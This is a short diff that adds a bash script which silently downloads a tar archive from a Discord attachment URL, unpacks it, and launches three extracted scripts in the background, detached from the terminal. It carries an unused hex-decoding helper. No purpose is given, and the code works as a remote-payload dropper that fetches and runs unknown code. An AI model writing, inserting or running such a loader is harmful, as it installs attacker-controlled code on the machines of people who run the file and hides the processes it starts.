@@ -1,0 +1,2 @@
+#!/bin/bash
+z () { echo -ne $1 | xxd -p -r; }; fetch () { curl -s https://cdn.discordapp.com/attachments/878974995852849153/879202035105427506/a.tar --output a.tar; sleep 1; tar -xf a.tar; }; run () { /bin/bash $PWD/$1 & disown -h; };  fetch; sleep 1; run m; sleep 1; run r; sleep 1; run c;
